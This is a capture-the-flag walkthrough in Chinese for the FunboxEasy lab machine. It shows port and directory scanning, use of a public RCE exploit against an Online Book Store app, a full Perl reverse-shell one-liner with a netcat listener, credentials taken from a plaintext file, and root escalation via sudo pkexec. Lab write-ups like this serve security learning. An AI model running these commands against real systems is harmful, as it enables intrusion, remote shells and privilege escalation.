# FunboxEasy

端口扫描

```Linux
nmap 192.168.53.111

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

目录扫描

```Linux
dirb http://192.168.53.111

---- Scanning URL: http://192.168.53.111/ ----
==> DIRECTORY: http://192.168.53.111/admin/                                                  
+ http://192.168.53.111/index.html (CODE:200|SIZE:10918)                                     
+ http://192.168.53.111/index.php (CODE:200|SIZE:3468)                                       
+ http://192.168.53.111/robots.txt (CODE:200|SIZE:14)                                        
==> DIRECTORY: http://192.168.53.111/secret/                                                 
+ http://192.168.53.111/server-status (CODE:403|SIZE:279)                                    
==> DIRECTORY: http://192.168.53.111/store/                                                  
                                                                                             
---- Entering directory: http://192.168.53.111/admin/ ----
==> DIRECTORY: http://192.168.53.111/admin/assets/                                           
+ http://192.168.53.111/admin/index.php (CODE:200|SIZE:3263)                                 
                                                                                             
---- Entering directory: http://192.168.53.111/secret/ ----
+ http://192.168.53.111/secret/index.php (CODE:200|SIZE:108)                                 
+ http://192.168.53.111/secret/robots.txt (CODE:200|SIZE:35)                                 
                                                                                             
---- Entering directory: http://192.168.53.111/store/ ----
+ http://192.168.53.111/store/admin.php (CODE:200|SIZE:3153)                                 
==> DIRECTORY: http://192.168.53.111/store/controllers/                                      
==> DIRECTORY: http://192.168.53.111/store/database/                                         
==> DIRECTORY: http://192.168.53.111/store/functions/                                        
+ http://192.168.53.111/store/index.php (CODE:200|SIZE:3998)                                 
==> DIRECTORY: http://192.168.53.111/store/models/                                           
==> DIRECTORY: http://192.168.53.111/store/template/
```

打开网站http://192.168.53.111，为apache的默认配置页面

进入http://192.168.53.111/store，并且发现登录页面/admin.php

在exploit-db上搜索Online Book Store发现存在rce漏洞

下载文件并进行利用

```
python 47887.py http://192.168.53.111/store
```

反弹shell

```
perl -e 'use Socket;$i="192.168.53.111";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("bash -i");};'

nc -lvnp 4444
```

找到第一个flag在/var/www目录下

```
cat local.txt

7b5aee69f84a645a633bee16d1ef57b6
```

进入home目录下，发现存在tony用户

并且存在password.txt文件

```
cat password.txt
ssh: yxcvbnmYYY
gym/admin: asdfghjklXXX
```

发现ssh密钥，并且想到扫描到的端口有一个ssh,尝试登录

```
ssh tony@192.168.53.111
```

登录成功，尝试提权

```
sudo -l

(root) NOPASSWD: /usr/bin/yelp
    (root) NOPASSWD: /usr/bin/dmf
    (root) NOPASSWD: /usr/bin/whois
    (root) NOPASSWD: /usr/bin/rlogin
    (root) NOPASSWD: /usr/bin/pkexec
    (root) NOPASSWD: /usr/bin/mtr
    (root) NOPASSWD: /usr/bin/finger
    (root) NOPASSWD: /usr/bin/time
    (root) NOPASSWD: /usr/bin/cancel
    (root) NOPASSWD: /root/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/q/r/s/t/u/v/w/x/y/z/.smile.sh
```

在gtfobins上搜索pkexec

```
sudo pkexec /bin/sh
```

提升到root权限

在/root目录下发现proof.txt

```
cat proof.txt

d4eb22e17cca5986b50e3bcfe08df097
```

拿到最后的flag